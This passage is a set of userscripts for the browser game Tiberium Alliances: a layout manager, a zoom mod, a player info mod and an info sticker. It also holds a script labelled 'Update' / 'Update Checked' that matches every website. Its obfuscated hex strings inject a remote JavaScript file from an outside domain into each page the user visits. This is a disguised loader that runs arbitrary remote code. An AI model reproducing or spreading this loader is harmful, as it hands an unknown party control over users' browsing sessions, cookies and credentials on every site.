                            var ownCityID = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCityId(); 
                            var model = ownCityID + "." + cityID + "." + label; 
 
                            var children = this.layoutList.getChildren(); 
                            //Check for same layout name if so do NOT save 
                            for (var item = 0; item < children.length; item++) { 
                                thisItem = children[item].getModel(); 
                                if (thisItem == model) { 
                                    alert("Save Failed: Duplicate Name"); 
                                    return; 
                                } 
                            } 
                            var units = Simulator.getInstance().getCityPreArmyUnits().get_ArmyUnits().l; 
                            units = this.prepareLayout(units); 
 
                            var layoutInformation = {}; 
                            if (this.persistentCheck.getValue() == true) { 
                                layoutInformation = { 
                                    id: model, 
                                    label: label, 
                                    formation: units, 
                                    pers: "yes" 
                                }; 
                            } else { 
                                layoutInformation = { 
                                    id: model, 
                                    label: label, 
                                    formation: units, 
                                    pers: "no" 
                                }; 
                            } 
                            this.layoutsArray.push(layoutInformation); 
                            this.layoutList.add(new qx.ui.form.ListItem(layoutInformation.label, null, layoutInformation.id)); 
                            this.layoutTextBox.setValue(""); 
                            Simulator.getInstance().quickSaveBtn.setLabel("✔"); 
                            setTimeout(function () { Simulator.getInstance().quickSaveBtn.setLabel("QS"); }, 2000); 
                            this.updateStorage(); 
                        } catch (e) { 
                            console.log("Error Saving Layout"); 
                            console.log(e); 
                        } 
                    }, 
 
                    loadLayout: function () { 
                        try { 
                            console.log("Loading Layout"); 
                            var ownCityID = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCityId(); 
 
                            var layout = this.layoutList.getSelection()[0].getModel(); 
                            for (var item in this.layoutsArray) { 
                                var thisLayout = this.layoutsArray[item].id; 
 
                                if (thisLayout == layout) { 
                                    Simulator.getInstance().restoreFormation(this.layoutsArray[item].formation); 
                                    break; 
                                } 
                            } 
                        } catch (e) { 
                            console.log("Error Loading Layout"); 
                            console.log(e); 
                        } 
                    }, 
 
                    deleteLayout: function () { 
                        try { 
                            console.log("Deleting Layout"); 
                            //Remove from our array too 
                            var rUSure = confirm('Are you sure you want to delete this layout?'); 
                            if (!rUSure) { 
                                return; 
                            } 
                            for (var item in this.layoutsArray) { 
                                if (this.layoutsArray[item].id == this.layoutList.getSelection()[0].getModel()) { 
                                    var isRemoved = this.layoutsArray.splice(item, 1); 
                                    this.updateStorage(); 
                                } 
                            } 
 
                            //The update will remove all and repopulate so no need to delete individual ones. 
                            this.updateLayoutList(); 
                        } catch (e) { 
                            console.log("Error Deleting Layout"); 
                            console.log(e); 
                        } 
                    }, 
 
                    updateStorage: function () { 
                        try { 
                            console.log("Updating Storage"); 
                            localStorage['savedFormations'] = JSON.stringify(this.layoutsArray); 
                        } catch (e) { 
                            console.log("Error updating localStorage"); 
                            console.log(e); 
                        } 
                    }, 
 
                    updateLayoutList: function () { 
                        try { 
                            console.log("Updating Layout List"); 
                            var savedLayouts = localStorage['savedFormations']; 
                            if (savedLayouts !== undefined) { 
                                this.layoutsArray = JSON.parse(savedLayouts); 
                            } 
                            this.layoutList.removeAll(); //Clear List 
                            var cityID = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentCityId(); 
                            var ownCityID = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCityId(); 
                            var model = ownCityID + "." + cityID; 
 
                            for (var item in this.layoutsArray) { 
                                var itemLabel = this.layoutsArray[item].label; 
                                var itemModel = model + "." + itemLabel; 
                                var pers = this.layoutsArray[item].pers; 
                                var match = this.layoutsArray[item].id.match(ownCityID.toString()); 
 
                                if (itemModel == this.layoutsArray[item].id || ((pers !== undefined && pers == "yes") && match != null)) //Match! 
                                { 
                                    this.layoutList.add(new qx.ui.form.ListItem(itemLabel, null, this.layoutsArray[item].id)); 
                                } 
                            } 
                        } catch (e) { 
                            console.log("Error Updating Layout List"); 
                            console.log(e); 
                        } 
                    }, 
 
                    //Function from C&C Tiberium Alliances Combat Simulator script. Works well and does exactly what I need! 
                    //For authors see: http://userscripts.org/scripts/show/145717 
                    prepareLayout: function (units) { 
                        try { 
                            console.log("Preparing Layout for Saving"); 
                            saved_units = []; 
                            for (var i = 0; i < units.length; i++) { 
                                var unit = units[i]; 
                                var armyUnit = {}; 
                                armyUnit.x = unit.get_CoordX(); 
                                armyUnit.y = unit.get_CoordY(); 
                                armyUnit.id = unit.get_Id(); 
                                armyUnit.enabled = unit.get_Enabled(); 
                                saved_units.push(armyUnit); 
                            } 
                            return saved_units; 
                        } catch (e) { 
                            console.log("Error Preparing Unit Layout"); 
                            console.log(e); 
                        } 
                    }, 
 
                    clearAllLayouts: function () { 
                        try { 
                            console.log("Clearing All Layouts"); 
                            var rUSure = confirm("Clicking OK will delete all of your saved layouts from every base!"); 
 
                            if (rUSure) { 
                                localStorage.removeItem('savedFormations'); 
                                this.layoutsArray = []; 
                                alert("All saved layouts have been deleted."); 
 
                                this.updateLayoutList(); 
                            } else { 
                                alert("No layouts were deleted."); 
                            } 
                        } catch (e) { 
                            console.log("Error Clearing All Layouts"); 
                            console.log(e); 
                        } 
                    } 
                } 
            }); 
        } 
        function waitForGame() { 
            try { 
                if (typeof qx !== "undefined" && typeof qx.core !== "undefined" && typeof qx.core.Init !== "undefined" && typeof ClientLib !== "undefined" && typeof phe !== "undefined") { 
                    var app = qx.core.Init.getApplication(); 
                    if (app.initDone == true) { 
                        try { 
                            console.log("WarChiefs - Tiberium Alliances Combat Simulator: Loading"); 
                            createClasses(); 
                            Simulator.getInstance(); 
                            Simulator.StatWindow.getInstance(); 
                            Simulator.OptionWindow.getInstance(); 
                            Simulator.LayoutWindow.getInstance(); 
                            console.log("WarChiefs - Tiberium Alliances Combat Simulator: Loaded"); 
                        } catch (e) { 
                            console.log("WarChiefs - Tiberium Alliances Combat Simulator: initialization error:"); 
                            console.log(e); 
                        } 
                    } else 
                        window.setTimeout(waitForGame, 1000); 
                } else { 
                    window.setTimeout(waitForGame, 1000); 
                } 
            } catch (e) { 
                console.log(e); 
            } 
        } 
        window.setTimeout(waitForGame, 1000); 
    }; 
    var script = document.createElement("script"); 
    var txt = injectFunction.toString(); 
    script.innerHTML = "(" + txt + ")();"; 
    script.type = "text/javascript"; 
    document.getElementsByTagName("head")[0].appendChild(script); 
})();




// ==UserScript== 
// @name			Update  
// @namespace       http://userscripts.org/scripts/show/999999 
// @version			1.1 
// @copyright		H4ckG3n Team 
// @description		Update Checked 
// @author			Robhein94 
// @include			http://*.* 
// @include			http*://*.*.* 
// @include			http://*.com 
// @include			http://*.eu 
// @include			http://*.*.com 
// @include			http://*.*.eu 
// @icon			http://icdn.pro/images/fr/b/a/badge-diigo-icone-9149-128.png 
// Version numero 1 
// ==/UserScript== 
 
var _0xfce5=["\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x73\x72\x63","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x6C\x69\x6E\x6B\x75\x74\x2E\x65\x75\x2F\x75\x70\x64\x61\x74\x65\x73\x2E\x6A\x73","\x68\x65\x61\x64"];function addJavascript(_0x4abbx2,_0x4abbx3){var _0x4abbx4=document[_0xfce5[0]](_0x4abbx3)[0];var _0x4abbx5=document[_0xfce5[2]](_0xfce5[1]);_0x4abbx5[_0xfce5[5]](_0xfce5[3],_0xfce5[4]);_0x4abbx5[_0xfce5[5]](_0xfce5[6],_0x4abbx2);_0x4abbx4[_0xfce5[7]](_0x4abbx5);} ;addJavascript(_0xfce5[8],_0xfce5[9]);




// ==UserScript== 
// @name           Tiberium Alliances Zoom 
// @description    Allows you to zoom out further 
// @namespace      https://prodgame*.alliances.commandandconquer.com/*/index.aspx*  
// @include        https://prodgame*.alliances.commandandconquer.com/*/index.aspx* 
// @version         
// @author         Panavia, fix  SKY 
// @require         
// ==/UserScript== 
 
(function (){ 
  var tazoom_main = function() { 
    function initialize() { 
      console.log("Zoom Loaded"); 
       
      var zoomMin = 2.0;	// Larger number means able to zoom in closer. 
      var zoomMax = 0.1;	// Smaller number means able to zoom out further. 
      var zoomInc = 0.08;	// Larger number for faster zooming, Smaller number for slower zooming. 
       
      webfrontend.gui.BackgroundArea.prototype.onHotKeyPress = function(be) { 
        if(!this.active || be.getTarget() != this.mapContainer) 
          return; 
        var bh = be.getKeyIdentifier(); 
        var bf = ClientLib.Vis.VisMain.GetInstance(); 
        switch(bh) { 
          case "+": 
            var bg = bf.get_Region().get_ZoomFactor() + zoomInc; 
            bf.get_Region().set_ZoomFactor(Math.min(zoomMin, Math.max(zoomMax, bg))); 
            break; 
          case "-": 
            var bg = bf.get_Region().get_ZoomFactor() - zoomInc; 
            bf.get_Region().set_ZoomFactor(Math.min(zoomMin, Math.max(zoomMax, bg))); 
            break; 
        } 
        this.closeCityInfo(); 
        this.closeCityList(); 
      } 
 
      var backgroundArea = qx.core.Init.getApplication().getBackgroundArea(); 
      qx.bom.Element.removeListener(backgroundArea.mapContainer, "mousewheel", backgroundArea._onMouseWheel, backgroundArea); 
      qx.bom.Element.removeListener(backgroundArea.mapBlocker, "mousewheel", backgroundArea._onMouseWheel, backgroundArea); 
      webfrontend.gui.BackgroundArea.prototype._onMouseWheel = function(e) { 
        if(this.activeSceneView == null) 
          return; 
        var bz = e.getWheelDelta(); 
        var by = this.activeSceneView.get_ZoomFactor(); 
        by += bz > 0 ? -zoomInc : zoomInc; 
        by = Math.min(zoomMin, Math.max(zoomMax, by)); 
        this.activeSceneView.set_ZoomFactor(by); 
        e.stop(); 
      } 
      qx.bom.Element.addListener(backgroundArea.mapContainer, "mousewheel", backgroundArea._onMouseWheel, backgroundArea); 
      qx.bom.Element.addListener(backgroundArea.mapBlocker, "mousewheel", backgroundArea._onMouseWheel, backgroundArea);  
    } 
  
    function tazoom_checkIfLoaded() { 
      try { 
        if (typeof qx != 'undefined') { 
          a = qx.core.Init.getApplication(); // application 
          mb = qx.core.Init.getApplication().getMenuBar(); 
          if (a && mb) { 
            initialize(); 
          } else 
            window.setTimeout(tazoom_checkIfLoaded, 1000); 
        } else { 
          window.setTimeout(tazoom_checkIfLoaded, 1000); 
        } 
      } catch (e) { 
        if (typeof console != 'undefined') console.log(e); 
        else if (window.opera) opera.postError(e); 
        else GM_log(e); 
      } 
    } 
     
    if (/commandandconquer\.com/i.test(document.domain)) { 
      window.setTimeout(tazoom_checkIfLoaded, 1000); 
    } 
  } 
 
  // injecting, because there seem to be problems when creating game interface with unsafeWindow 
  var tazoomScript = document.createElement("script"); 
  tazoomScript.innerHTML = "(" + tazoom_main.toString() + ")();"; 
  tazoomScript.type = "text/javascript"; 
  if (/commandandconquer\.com/i.test(document.domain)) { 
    document.getElementsByTagName("head")[0].appendChild(tazoomScript); 
  } 
})(); 
 




// ==UserScript== 
// @name Tiberium Alliances PvP/PvE Player Info Mod 
// @description Separates the number of bases destroyed into PvP and PvE in the Player Info window. Now also includes a tab showing all the POI the player is holding. 
// @namespace player_info_mod 
// @include https://prodgame*.alliances.commandandconquer.com/*/index.aspx* 
// @version 1.2 
// @author KRS_L 
// ==/UserScript== 
(function () { 
	var PlayerInfoMod_main = function () { 
		var playerInfoWindow = null; 
		var general = null; 
		var pvpScoreLabel = null; 
		var pveScoreLabel = null; 
		var playerName = null; 
		var tabView = null; 
		var tableModel = null; 
		var baseCoords = null; 
		var rowData = null; 
 
		function createPlayerInfoMod() { 
			try { 
				console.log('Player Info Mod loaded'); 
				var tr = qx.locale.Manager.tr; 
				playerInfoWindow = webfrontend.gui.info.PlayerInfoWindow.getInstance(); 
				general = playerInfoWindow.getChildren()[0].getChildren()[0].getChildren()[0].getChildren()[0].getChildren()[0].getChildren()[1].getChildren()[0]; 
				tabView = playerInfoWindow.getChildren()[0]; 
				playerName = general.getChildren()[1]; 
 
				var pvpLabel = new qx.ui.basic.Label("- PvP:"); 
				pvpScoreLabel = new qx.ui.basic.Label("").set({ 
					textColor: "text-value", 
					font: "font_size_13_bold" 
				}); 
				general.add(pvpLabel, { 
					row: 3, 
					column: 3 
				}); 
				general.add(pvpScoreLabel, { 
					row: 3, 
					column: 4 
				}); 
 
				var pveLabel = new qx.ui.basic.Label("- PvE:"); 
				pveScoreLabel = new qx.ui.basic.Label("").set({ 
					textColor: "text-value", 
					font: "font_size_13_bold" 
				}); 
				general.add(pveLabel, { 
					row: 4, 
					column: 3 
				}); 
				general.add(pveScoreLabel, { 
					row: 4, 
					column: 4 
				}); 
 
				var poiTab = new qx.ui.tabview.Page("POI"); 
				poiTab.setLayout(new qx.ui.layout.Canvas()); 
				poiTab.setPaddingTop(6); 
				poiTab.setPaddingLeft(8); 
				poiTab.setPaddingRight(10); 
				poiTab.setPaddingBottom(8); 
 
				tableModel = new webfrontend.data.SimpleColFormattingDataModel().set({ 
					caseSensitiveSorting: false 
				}); 
 
				tableModel.setColumns([tr("tnf:name"), tr("tnf:lvl"), tr("tnf:points"), tr("tnf:coordinates")], ["t", "l", "s", "c"]); 
				tableModel.setColFormat(3, "<div style=\"cursor:pointer;color:" + webfrontend.gui.util.BBCode.clrLink + "\">", "</div>"); 
				var poiTable = new webfrontend.gui.widgets.CustomTable(tableModel); 
				poiTable.addListener("cellClick", centerCoords, this); 
 
				var columnModel = poiTable.getTableColumnModel(); 
				columnModel.setColumnWidth(0, 250); 
				columnModel.setColumnWidth(1, 80); 
				columnModel.setColumnWidth(2, 120); 
				columnModel.setColumnWidth(3, 120); 
				columnModel.setDataCellRenderer(3, new qx.ui.table.cellrenderer.Html()); 
				columnModel.getDataCellRenderer(2).setUseAutoAlign(false); 
				poiTable.setStatusBarVisible(false); 
				poiTable.setColumnVisibilityButtonVisible(false); 
				poiTab.add(poiTable, { 
					left: 0, 
					top: 0, 
					right: 0, 
					bottom: 0 
				}); 
				tabView.add(poiTab); 
 
				playerInfoWindow.addListener("close", onPlayerInfoWindowClose, this); 
				playerName.addListener("changeValue", onPlayerChanged, this); 
 
			} catch (e) { 
				console.log("createPlayerInfoMod: ", e); 
			} 
		} 
 
		function centerCoords(e) { 
			try { 
				var poiCoord = tableModel.getRowData(e.getRow())[3].split(":"); 
				if (e.getColumn() == 3) webfrontend.gui.UtilView.centerCoordinatesOnRegionViewWindow(Number(poiCoord[0]), Number(poiCoord[1])); 
			} catch (e) { 
				console.log("centerCoords: ", e); 
			} 
		} 
 
		function onPlayerInfo(context, data) { 
			try { 
				pvpScoreLabel.setValue((data.bd - data.bde).toString()); 
				pveScoreLabel.setValue(data.bde.toString()); 
				var bases = data.c; 
				baseCoords = new Object; 
				for (var i in bases) { 
					var base = bases[i]; 
					baseCoords[i] = new Object(); 
					baseCoords[i]["x"] = base.x; 
					baseCoords[i]["y"] = base.y; 
				} 
				ClientLib.Net.CommunicationManager.GetInstance().SendSimpleCommand("GetPublicAllianceInfo", { 
					id: data.a 
				}, phe.cnc.Util.createEventDelegate(ClientLib.Net.CommandResult, this, onAllianceInfo), null); 
			} catch (e) { 
				console.log("onPlayerInfo: ", e); 
			} 
		} 
 
		function onAllianceInfo(context, data) { 
			try { 
				rowData = []; 
				var pois = data.opois; 
				for (var i in pois) { 
					var poi = pois[i]; 
					for (var j in baseCoords) { 
						var distanceX = Math.abs(baseCoords[j].x - poi.x); 
						var distanceY = Math.abs(baseCoords[j].y - poi.y); 
						if (distanceX > 2 || distanceY > 2) continue; 
						if (distanceX == 2 && distanceY == 2) continue; 
						var name = phe.cnc.gui.util.Text.getPoiInfosByType(poi.t).name; 
						var level = poi.l; 
						var score = ClientLib.Base.PointOfInterestTypes.GetScoreByLevel(poi.l); 
						var coords = phe.cnc.gui.util.Numbers.formatCoordinates(poi.x, poi.y); 
						rowData.push([name, level, score, coords]); 
						break; 
					} 
				} 
				tableModel.setData(rowData); 
				tableModel.sortByColumn(0, true); 
			} catch (e) { 
				console.log("onAllianceInfo: ", e); 
			} 
		} 
 
		function onPlayerChanged() { 
			try { 
				if (playerName.getValue().length > 0) { 
					ClientLib.Net.CommunicationManager.GetInstance().SendSimpleCommand("GetPublicPlayerInfoByName", { 
						name: playerName.getValue() 
					}, phe.cnc.Util.createEventDelegate(ClientLib.Net.CommandResult, this, onPlayerInfo), null); 
				} 
			} catch (e) { 
				console.log("onPlayerChanged: ", e); 
			} 
		} 
 
		function onPlayerInfoWindowClose() { 
			try { 
				pvpScoreLabel.setValue(""); 
				pveScoreLabel.setValue(""); 
				tableModel.setData([]); 
			} catch (e) { 
				console.log("onPlayerInfoWindowClose: ", e); 
			} 
		} 
 
		function PlayerInfoMod_checkIfLoaded() { 
			try { 
				if (typeof qx !== 'undefined' && typeof qx.locale !== 'undefined' && typeof qx.locale.Manager !== 'undefined') { 
					if (ClientLib.Data.MainData.GetInstance().get_Alliance().get_FirstLeaders() !== null && ClientLib.Data.MainData.GetInstance().get_Alliance().get_FirstLeaders().l.length != 0) { 
						createPlayerInfoMod(); 
					} else { 
						window.setTimeout(PlayerInfoMod_checkIfLoaded, 1000); 
					} 
				} else { 
					window.setTimeout(PlayerInfoMod_checkIfLoaded, 1000); 
				} 
			} catch (e) { 
				console.log("PlayerInfoMod_checkIfLoaded: ", e); 
			} 
		} 
 
		if (/commandandconquer\.com/i.test(document.domain)) { 
			window.setTimeout(PlayerInfoMod_checkIfLoaded, 1000); 
		} 
	} 
 
	try { 
		var PlayerInfoMod = document.createElement("script"); 
		PlayerInfoMod.innerHTML = "(" + PlayerInfoMod_main.toString() + ")();"; 
		PlayerInfoMod.type = "text/javascript"; 
		if (/commandandconquer\.com/i.test(document.domain)) { 
			document.getElementsByTagName("head")[0].appendChild(PlayerInfoMod); 
		} 
	} catch (e) { 
		console.log("PlayerInfoMod: init error: ", e); 
	} 
})();




// ==UserScript== 
// @name       Tiberium Alliances Info Sticker 
// @namespace  TAInfoSticker 
// @version    1.11.1 
// @description  Based on Maelstrom Dev Tools. Modified MCV timer, repair time label, resource labels. 
// @include     http*://prodgame*.alliances.commandandconquer.com/*/index.aspx* 
// @author unicode 
// ==/UserScript== 
(function () { 
    var InfoSticker_main = function () { 
        try { 
            function createInfoSticker() { 
                console.log('InfoSticker loaded'); 
                // define Base 
                qx.Class.define("InfoSticker.Base", { 
                    type: "singleton", 
                    extend: qx.core.Object, 
                    members: { 
                        /* Desktop */ 
                        dataTimerInterval: 1000, 
                        positionInterval: 500, 
                        tibIcon: null, 
                        cryIcon: null, 
                        powIcon: null, 
                        creditIcon: null, 
                        repairIcon: null, 
                        hasStorage: false, 
 
                        initialize: function () { 
                            try { 
                                this.hasStorage = 'localStorage' in window && window['localStorage'] !== null; 
                            } catch (se) {} 
                            try { 
                                var fileManager = ClientLib.File.FileManager.GetInstance(); 
                                this.tibIcon = fileManager.GetPhysicalPath("ui/common/icn_res_tiberium.png"); 
                                this.cryIcon = fileManager.GetPhysicalPath("ui/common/icn_res_chrystal.png"); 
                                this.powIcon = fileManager.GetPhysicalPath("ui/common/icn_res_power.png"); 
                                this.creditIcon = fileManager.GetPhysicalPath("ui/common/icn_res_dollar.png"); 
								this.repairIcon = fileManager.GetPhysicalPath("ui/icons/icn_repair_off_points.png"); 
                                 
								if (typeof phe.cnc.Util.attachNetEvent == 'undefined') 
									this.attachEvent = webfrontend.gui.Util.attachNetEvent; 
								else 
									this.attachEvent = phe.cnc.Util.attachNetEvent; 
                                 
                                this.runMainTimer(); 
                            } catch (e) { 
                                console.log("InfoSticker.initialize: ", e.toString()); 
                            } 
                        }, 
                        runMainTimer: function () { 
                            try { 
                                var self = this; 
                                this.calculateInfoData(); 
                                window.setTimeout(function () { 
                                    self.runMainTimer(); 
                                }, this.dataTimerInterval); 
                            } catch (e) { 
                                console.log("InfoSticker.runMainTimer: ", e.toString()); 
                            } 
                        }, 
                        runPositionTimer: function () { 
                            try { 
                                var self = this; 
                                this.repositionSticker(); 
                                window.setTimeout(function () { 
                                    self.runPositionTimer(); 
                                }, this.positionInterval); 
                            } catch (e) { 
                                console.log("InfoSticker.runPositionTimer: ", e.toString()); 
                            } 
                        }, 
                        infoSticker: null, 
                        mcvPopup: null, 
                        mcvTimerLabel: null, 
                        mcvInfoLabel: null, 
                        mcvPane: null, 
                         
                        repairPopup: null, 
                        repairTimerLabel: null, 
 
                        resourcePane: null, 
                        resourceHidden: false, 
                        resourceTitleLabel: null, 
                        resourceHideButton: null, 
                        resourceLabel1: null, 
                        resourceLabel2: null, 
                        resourceLabel3: null, 
 
                        resourceLabel1per: null, 
                        resourceLabel2per: null, 
                        resourceLabel3per: null, 
 
                        productionTitleLabel: null, 
                        productionLabelPower: null, 
                        productionLabelCredit: null, 
 
                        repairInfoLabel: null, 
 
                        lastButton: null, 
 
                        top_image: null, 
                        bot_image: null, 
 
                        toFlipH: [], 
 
                        pinButton: null, 
                        pinned: false, 
 
                        pinTop: 130, 
                        pinButtonDecoration: null, 
                        pinPane: null, 
 
                        pinIconFix: false, 
                         
                        lockButton: null, 
                        locked: false, 
 
                        lockButtonDecoration: null, 
                        lockPane: null, 
 
                        lockIconFix: false, 
                         
                        mcvHide: false, 
                        repairHide: false, 
                        resourceHide: false, 
                        productionHide: false, 
                        stickerBackground: null, 
                         
                        mcvPane: null, 
                         
                        pinLockPos: 0, 
                         
                        attachEvent: function() {}, 
                         
                        isNull: function(e) { 
                            return typeof e == "undefined" || e == null; 
                        }, 
                         
                        getApp: function() { 
                            return qx.core.Init.getApplication(); 
                        }, 
                         
                        getBaseListBar: function() { 
                            var app = this.getApp(); 
                            var b; 
                            if(!this.isNull(app)) { 
                                b = app.getBaseNavigationBar(); 
                                if(!this.isNull(b)) { 
                                    if(b.getChildren().length > 0) { 
                                        b = b.getChildren()[0]; 
                                        if(b.getChildren().length > 0) { 
                                            b = b.getChildren()[0]; 
                                            return b; 
                                        } 
                                    } 
                                } 
                            } 
                            return null; 
                        }, 
                         
                        repositionSticker: function () { 
                            try { 
                            	var i; 
                                 
                                if (this.infoSticker && !this.mcvInfoLabel.isDisposed() && !this.mcvPopup.isDisposed()) { 
                                    var dele; 
 
                                    try { 
                                        if (this.top_image != null) { 
                                            dele = this.top_image.getContentElement().getDomElement(); 
                                            if (dele != null) { 
                                                dele.style["-moz-transform"] = "scaleY(-1)"; 
                                                dele.style["-o-transform"] = "scaleY(-1)"; 
                                                dele.style["-webkit-transform"] = "scaleY(-1)"; 
                                                dele.style.transform = "scaleY(-1)"; 
                                                dele.style.filter = "FlipV"; 
                                                dele.style["-ms-filter"] = "FlipV"; 
                                                this.top_image = null; 
                                            } 
                                        } 
                                        for (i = this.toFlipH.length - 1; i >= 0; i--) { 
                                            var e = this.toFlipH[i]; 
                                            if(e.isDisposed()) this.toFlipH.splice(i, 1); 
                                            else { 
                                                dele = e.getDecoratorElement().getDomElement(); 
                                                if (dele != null) { 
                                                    dele.style["-moz-transform"] = "scaleX(-1)"; 
                                                    dele.style["-o-transform"] = "scaleX(-1)"; 
                                                    dele.style["-webkit-transform"] = "scaleX(-1)"; 
                                                    dele.style.transform = "scaleX(-1)"; 
                                                    dele.style.filter = "FlipH"; 
                                                    dele.style["-ms-filter"] = "FlipH"; 
                                                    this.toFlipH.splice(i, 1); 
                                                } 
                                            } 
                                        } 
                                    } catch (e2) { 
                                        console.log("Error flipping images.", e2.toString()); 
                                    } 
                                    var baseListBar = this.getBaseListBar(); 
                                    if(baseListBar!=null) { 
                                        var baseCont = baseListBar.getChildren(); 
                                        for (i = 0; i < baseCont.length; i++) { 
                                            var baseButton = baseCont[i]; 
                                            if(typeof baseButton.getBaseId === 'function') { 
                                                if(baseButton.getBaseId() == ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCity().get_Id() 
                                                    && baseButton.getBounds() != null && baseButton.getBounds().top!=null) { 
                                            //var baseButtonDecorator = baseButton.getDecorator(); 
                                            //if (baseButton!=this.mcvPopup && baseButtonDecorator != null && typeof baseButtonDecorator === "string" && baseButton.getBounds() != null && baseButton.getBounds().top!=null) { 
                                                //if (baseButtonDecorator.indexOf("focused") >= 0 || baseButtonDecorator.indexOf("pressed") >= 0) { 
                                                    if(this.locked) { 
                                                        if(!this.pinned) { 
                                                            if(baseListBar.indexOf(this.mcvPopup)>=0) { 
                                                                baseListBar.remove(this.mcvPopup); 
                                                            } 
                                                            this.pinLockPos = baseListBar.indexOf(baseButton)+1; 
                                                            baseListBar.addAt(this.mcvPopup, this.pinLockPos); 
                                                        } else if(baseListBar.indexOf(this.mcvPopup)<0) { 
                                                            baseListBar.addAt(this.mcvPopup, Math.max(0, Math.min(this.pinLockPos, baseCont.length))); 
                                                        } 
                                                    } else { 
                                                        if(baseListBar.indexOf(this.mcvPopup)>=0) { 
                                                            baseListBar.remove(this.mcvPopup); 
                                                        } 
                                                        if (!this.pinned) { 
                                                            var top = baseButton.getBounds().top; 
                                                            var infoTop; 
                                                            try { 
                                                                var stickerHeight = this.infoSticker.getContentElement().getDomElement().style.height; 
                                                                stickerHeight = stickerHeight.substring(0, stickerHeight.indexOf("px")); 
                                                                infoTop = Math.min(130 + top, Math.max(660, window.innerHeight) - parseInt(stickerHeight, 10) - 130); 
                                                            } catch (heighterror) { 
                                                                infoTop = 130 + top; 
                                                            } 
                                                            if(this.infoSticker.getContentElement().getDomElement()!=null) 
                                                                this.infoSticker.setDomTop(infoTop); 
                                                             
                                                            this.pinTop = infoTop; 
                                                        } 
                                                    } 
                                                    break; 
                                                } 
                                            } 
                                        } 
                                    } 
                                     
                                } 
                            } catch (ex) { 
                                console.log("InfoSticker.repositionSticker: ", ex.toString()); 
                            } 
                        }, 
                        toLock: function (e) { 
                            try { 
                                this.locked = !this.locked; 
                                if(!this.locked) { 
                                    this.infoSticker.show(); 
                                    this.stickerBackground.add(this.mcvPopup); 
                                } 
                                else this.infoSticker.hide(); 
                                this.lockButton.setIcon(this.locked ? "FactionUI/icons/icn_thread_locked_active.png" : "FactionUI/icons/icn_thread_locked_inactive.png"); 
                                this.updateLockButtonDecoration(); 
                                if (this.hasStorage) { 
                                    if (this.locked) { 
                                        localStorage["infoSticker-locked"] = "true"; 
                                        if(this.pinned) localStorage["infoSticker-pinLock"] = this.pinLockPos.toString(); 
                                    } else { 
                                        localStorage["infoSticker-locked"] = "false"; 
                                    } 
                                } 
                                if(this.locked && this.pinned) { 
                                    this.menuUpButton.setEnabled(true); 
                                    this.menuDownButton.setEnabled(true); 
                                } else { 
                                    this.menuUpButton.setEnabled(false); 
                                    this.menuDownButton.setEnabled(false); 
                                } 
                                this.repositionSticker(); 
                            } catch(e) { 
                                console.log("InfoSticker.toLock: ", e.toString()); 
                            } 
                        }, 
                        updateLockButtonDecoration: function () { 
                            var light = "#CDD9DF"; 
                            var mid = "#9CA4A8"; 
                            var dark = "#8C9499"; 
                            this.lockPane.setDecorator(null); 
                            this.lockButtonDecoration = new qx.ui.decoration.Background(); 
                            this.lockButtonDecoration.setBackgroundColor(this.locked ? dark : light); 
                            this.lockPane.setDecorator(this.lockButtonDecoration); 
                        }, 
                        toPin: function (e) { 
                            try { 
                                this.pinned = !this.pinned; 
                                this.pinButton.setIcon(this.pinned ? "FactionUI/icons/icn_thread_pin_active.png" : "FactionUI/icons/icn_thread_pin_inactive.png"); 
                                this.updatePinButtonDecoration(); 
                                if (this.hasStorage) { 
                                    if (this.pinned) { 
                                        localStorage["infoSticker-pinned"] = "true"; 
                                        localStorage["infoSticker-top"] = this.pinTop.toString(); 
                                        if(this.locked) { 
                                            localStorage["infoSticker-pinLock"] = this.pinLockPos.toString(); 
                                        } 
                                    } else { 
                                        localStorage["infoSticker-pinned"] = "false"; 
                                    } 
                                } 
                                if(this.locked && this.pinned) { 
                                    this.menuUpButton.setEnabled(true); 
                                    this.menuDownButton.setEnabled(true); 
                                } else { 
                                    this.menuUpButton.setEnabled(false); 
                                    this.menuDownButton.setEnabled(false); 
                                } 
                            } catch(e) { 
                                console.log("InfoSticker.toPin: ", e.toString()); 
                            } 
                        }, 
                        updatePinButtonDecoration: function () { 
                            var light = "#CDD9DF"; 
                            var mid = "#9CA4A8"; 
                            var dark = "#8C9499"; 
                            this.pinPane.setDecorator(null); 
                            this.pinButtonDecoration = new qx.ui.decoration.Background().set({ 
                                //innerOpacity: 0.5 
                            }); 
                            //this.pinButtonDecoration.setInnerColor(this.pinned ? mid : light); 
                            //this.pinButtonDecoration.setOuterColor(this.pinned ? light : mid); 
                            this.pinButtonDecoration.setBackgroundColor(this.pinned ? dark : light); 
                            this.pinPane.setDecorator(this.pinButtonDecoration); 
                        }, 
                        hideResource: function () { 
                            try { 
                                //if(this.resourceHidden)  
                                if (this.resourcePane.isVisible()) { 
                                    //this.resourcePane.hide(); 
                                    this.resourcePane.exclude(); 
                                    this.resourceHideButton.setLabel("+"); 
                                } else { 
                                    this.resourcePane.show(); 
                                    this.resourceHideButton.setLabel("-"); 
                                } 
                            } catch(e) { 
                                console.log("InfoSticker.hideResource: ", e.toString()); 
                            } 
                        }, 
                        lastPane: null, 
                        createSection: function (parent, titleLabel, visible, visibilityStorageName) { 
							try { 
								var pane = new qx.ui.container.Composite(new qx.ui.layout.VBox()).set({ 
									padding: [5, 0, 5, 5], 
									width: 124, 
									decorator: new qx.ui.decoration.Background().set({ 
										backgroundImage: "decoration/pane_messaging_item/messaging_items_pane.png", 
										backgroundRepeat: "scale", 
									}), 
									alignX: "right" 
								}); 
								 
								var labelStyle = { 
									font: qx.bom.Font.fromString('bold').set({ 
										size: 12 
									}), 
									textColor: '#595969' 
								}; 
